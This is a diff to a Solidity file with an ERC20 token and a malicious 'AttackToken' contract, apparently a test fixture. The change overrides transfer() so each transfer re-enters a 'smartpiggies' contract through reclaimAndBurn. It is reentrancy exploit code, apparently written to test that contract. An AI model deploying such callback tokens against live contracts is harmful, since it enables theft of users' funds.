@@ -134,9 +134,9 @@ contract ERC20 is IERC20 {
      * no way affects any of the arithmetic of the contract, including
      * {IERC20-balanceOf} and {IERC20-transfer}.
      */
-    //function decimals() public view returns (uint8) {
-    //    return _decimals;
-    //}
+    function decimals() public view returns (uint8) {
+        return _decimals;
+    }
 
     /**
      * @dev See {IERC20-totalSupply}.
@@ -160,10 +160,10 @@ contract ERC20 is IERC20 {
      * - `recipient` cannot be the zero address.
      * - the caller must have a balance of at least `amount`.
      */
-    function transfer(address recipient, uint256 amount) public returns (bool) {
-        _transfer(msg.sender, recipient, amount);
-        return true;
-    }
+    //function transfer(address recipient, uint256 amount) public returns (bool) {
+    //    _transfer(msg.sender, recipient, amount);
+    //    return true;
+    //}
 
     /**
      * @dev See {IERC20-allowance}.
@@ -358,8 +358,9 @@ contract ERC20 is IERC20 {
 }
 
 
-contract AttackToken is ERC20 {
+contract AttackTokenReclaim is ERC20 {
   uint256 public count;
+  uint256 public tokenId;
   address public smartpiggies;
   uint256 public strike = 10000;
   bool public didAttack;
@@ -396,25 +397,26 @@ contract AttackToken is ERC20 {
     count++;
   }
 
-  function decimals() public returns (uint8) {
-    count++;
-    if (count < 3)
-        attack();
-    return _decimals;
-  }
-
-  //function decimals() public returns (uint8) {
-    //return _decimals;
-  //}
-
   function attack()
     public
   {
-    bytes memory payload = abi.encodeWithSignature("createPiggy(address,address,address,uint256,uint256,uint256,uint256,bool,bool,bool)",address(this),address(this),address(0),100,1,12300,100,false,false,false);
+    bytes memory payload = abi.encodeWithSignature("reclaimAndBurn(uint256)", tokenId);
    (bool success, bytes memory data) = address(smartpiggies).call.gas(1000000)(payload);
     returnData = data;
     returnString = string(data);
     didAttack = success;
+  }
+
+  function transfer(address recipient, uint256 amount) public returns (bool) {
+      _transfer(msg.sender, recipient, amount);
+      attack();
+      return true;
+  }
+
+  function setTokenId(uint256 _id)
+    public
+  {
+      tokenId = _id;
   }
 
   function setAddress(address _smartpiggies)
